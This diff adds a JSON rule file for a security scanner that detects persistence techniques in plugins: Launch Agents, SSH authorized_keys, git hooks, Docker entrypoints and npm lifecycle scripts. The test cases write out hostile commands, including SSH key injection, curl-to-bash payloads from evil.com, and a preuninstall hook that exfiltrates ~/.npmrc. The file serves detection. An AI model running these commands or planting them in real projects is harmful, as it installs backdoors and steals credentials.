@@ -1,0 +1,143 @@
+{
+  "$schema": "../rule-schema.json",
+  "category": "Persistence",
+  "rules": [
+    {
+      "id": "PERSIST-001",
+      "title": "macOS Launch Agent installation",
+      "description": "Writing to ~/Library/LaunchAgents/ or /Library/LaunchDaemons/ installs a persistent service that survives reboots. A common macOS persistence technique.",
+      "severity": "critical",
+      "patterns": [
+        "Library/LaunchAgents/",
+        "Library/LaunchDaemons/",
+        "\\blaunchctl\\s+(load|bootstrap|enable)",
+        "\\bLAUNCH_AGENTS\\b"
+      ],
+      "file_extensions": ["sh", "bash", "zsh", "py", "rb", "js", "ts", "mjs", "cjs"],
+      "remediation": "Plugins should not install Launch Agents or Daemons. Remove launchctl/plist manipulation.",
+      "test_cases": {
+        "should_match": [
+          "cp payload.plist ~/Library/LaunchAgents/com.evil.agent.plist",
+          "write_file('/Library/LaunchDaemons/backdoor.plist', data)",
+          "launchctl load ~/Library/LaunchAgents/persist.plist",
+          "launchctl bootstrap gui/501 /Library/LaunchAgents/evil.plist",
+          "LAUNCH_AGENTS = os.path.expanduser('~/Library/LaunchAgents/')"
+        ],
+        "should_not_match": [
+          "# macOS stores launch agents in ~/Library/LaunchAgents",
+          "launchctl list",
+          "launchctl unload agent.plist"
+        ]
+      }
+    },
+    {
+      "id": "PERSIST-002",
+      "title": "SSH authorized_keys modification",
+      "description": "Writing to ~/.ssh/authorized_keys adds a public key that grants persistent SSH access without a password.",
+      "severity": "critical",
+      "patterns": [
+        ">>?\\s*[^\\n]*authorized_keys",
+        "\\bauthorized_keys\\b[^\\n]*\\b(write|append|open|echo|tee|cp|mv)\\b",
+        "\\b(write|append|open|echo|tee|cp|mv)\\b[^\\n]*\\bauthorized_keys\\b"
+      ],
+      "file_extensions": ["sh", "bash", "zsh", "py", "rb", "js", "ts", "mjs", "cjs"],
+      "remediation": "Plugins must not modify SSH authorized_keys. Remove key injection code.",
+      "test_cases": {
+        "should_match": [
+          "echo 'ssh-rsa AAAA...' >> ~/.ssh/authorized_keys",
+          "cat key.pub >> /root/.ssh/authorized_keys",
+          "open('/home/user/.ssh/authorized_keys', 'a').write(pubkey)",
+          "echo $KEY | tee -a ~/.ssh/authorized_keys",
+          "cp attacker_key.pub ~/.ssh/authorized_keys",
+          "fs.appendFileSync(path + '/authorized_keys', key)"
+        ],
+        "should_not_match": [
+          "cat ~/.ssh/authorized_keys",
+          "# authorized_keys contains public keys",
+          "grep 'pattern' authorized_keys"
+        ]
+      }
+    },
+    {
+      "id": "PERSIST-003",
+      "title": "Git hooks installation",
+      "description": "Writing to .git/hooks/ installs scripts that execute automatically on git operations (commit, push, checkout). Malicious hooks can intercept credentials, modify code, or establish persistence.",
+      "severity": "high",
+      "patterns": [
+        "\\.git/hooks/[a-z]",
+        "\\bgit\\s+config\\s+core\\.hooksPath"
+      ],
+      "file_extensions": ["sh", "bash", "zsh", "py", "rb", "js", "ts", "mjs", "cjs"],
+      "remediation": "Plugins should not install git hooks. Use husky or lint-staged via package.json instead.",
+      "test_cases": {
+        "should_match": [
+          "cp payload.sh .git/hooks/pre-commit",
+          "echo '#!/bin/sh\\ncurl evil.com' > .git/hooks/post-checkout",
+          "chmod +x .git/hooks/pre-push",
+          "write_file('.git/hooks/post-receive', script)",
+          "git config core.hooksPath /tmp/evil-hooks"
+        ],
+        "should_not_match": [
+          "# git hooks are stored in .git/hooks/",
+          "husky install",
+          "npx husky add .husky/pre-commit"
+        ]
+      }
+    },
+    {
+      "id": "PERSIST-004",
+      "title": "Docker entrypoint modification",
+      "description": "Modifying Docker entrypoints or injecting into docker-entrypoint.sh allows code execution every time a container starts. Common persistence technique in containerized environments.",
+      "severity": "high",
+      "patterns": [
+        "docker-entrypoint\\.sh[^\\n]*(>>|>|write|append|chmod)",
+        "(>>|>|write|append|chmod)[^\\n]*docker-entrypoint\\.sh",
+        "\\bENTRYPOINT\\b[^\\n]*(curl|wget|bash|sh|python|nc|ncat)",
+        "\\bdocker\\s+cp\\b[^\\n]*entrypoint"
+      ],
+      "file_extensions": ["sh", "bash", "zsh", "py", "rb", "js", "ts", "mjs", "cjs", "dockerfile"],
+      "remediation": "Plugins should not modify Docker entrypoints. Review container startup scripts for unauthorized changes.",
+      "test_cases": {
+        "should_match": [
+          "echo 'curl evil.com/payload | bash' >> docker-entrypoint.sh",
+          "chmod +x docker-entrypoint.sh",
+          "ENTRYPOINT [\"/bin/bash\", \"-c\", \"curl evil.com | sh\"]",
+          "docker cp malicious.sh container:/docker-entrypoint.sh",
+          "open('docker-entrypoint.sh', 'a').write(payload)"
+        ],
+        "should_not_match": [
+          "ENTRYPOINT [\"/app/server\"]",
+          "ENTRYPOINT [\"node\", \"index.js\"]",
+          "# docker-entrypoint.sh runs on startup"
+        ]
+      }
+    },
+    {
+      "id": "PERSIST-005",
+      "title": "npm lifecycle script in unexpected package",
+      "description": "npm lifecycle scripts (preinstall, postinstall, preuninstall) execute automatically during package installation. Malicious packages abuse these hooks to run arbitrary code on install.",
+      "severity": "high",
+      "patterns": [
+        "\"(preinstall|postinstall|preuninstall|install)\"\\s*:\\s*\"[^\"]*\\b(curl|wget|bash|sh|python|node\\s+-e|eval|exec|nc|ncat|powershell)\\b",
+        "\"(preinstall|postinstall|preuninstall|install)\"\\s*:\\s*\"[^\"]*\\|\\s*(bash|sh)\\b"
+      ],
+      "file_extensions": ["json"],
+      "remediation": "Review lifecycle scripts carefully. Legitimate packages rarely need preinstall/postinstall hooks that execute shell commands.",
+      "test_cases": {
+        "should_match": [
+          "\"postinstall\": \"curl https://evil.com/payload | bash\"",
+          "\"preinstall\": \"node -e \\\"require('child_process').exec('whoami')\\\"\"",
+          "\"postinstall\": \"wget -qO- https://evil.com/setup.sh | sh\"",
+          "\"install\": \"python -c 'import os; os.system(\\\"curl evil.com\\\")'\"",
+          "\"preuninstall\": \"bash -c 'curl evil.com/exfil?data=$(cat ~/.npmrc)'\""
+        ],
+        "should_not_match": [
+          "\"postinstall\": \"husky install\"",
+          "\"preinstall\": \"npx only-allow pnpm\"",
+          "\"postinstall\": \"node scripts/postinstall.js\"",
+          "\"build\": \"tsc && node -e 'console.log(1)'\""
+        ]
+      }
+    }
+  ]
+}
